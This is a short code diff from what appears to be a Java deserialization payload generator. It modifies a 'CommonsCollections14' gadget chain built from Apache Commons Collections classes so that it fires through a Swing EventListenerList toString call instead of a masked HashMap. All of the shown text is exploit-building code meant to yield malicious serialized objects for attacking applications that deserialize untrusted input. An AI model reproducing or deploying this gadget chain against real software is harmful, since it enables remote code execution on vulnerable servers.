@@ -11,6 +11,7 @@ import org.apache.commons.collections.functors.ConstantFactory;
 import org.apache.commons.collections.keyvalue.TiedMapEntry;
 import org.apache.commons.collections.map.LazyMap;
 
+import javax.swing.event.EventListenerList;
 import java.util.HashMap;
 import java.util.Map;
 
@@ -24,11 +25,10 @@ public class CommonsCollections14 implements ObjectPayload<Object> {
         Transformer transformerChain = new ChainedTransformer(transformers);
         Map decorate = LazyMap.decorate(new HashMap(), new ConstantFactory(1));
         TiedMapEntry tiedMapEntry = new TiedMapEntry(decorate,1);
-        HashMap hashMap = Gadgets.maskmapToString(tiedMapEntry, tiedMapEntry);
+        EventListenerList eventtostring = Gadgets.eventtostring(tiedMapEntry);
         Reflections.setFieldValue(decorate, "factory",transformerChain );
-        Reflections.setFieldValue(tiedMapEntry, "key",233);
 
-        return hashMap;
+        return eventtostring;
     }
 
 }
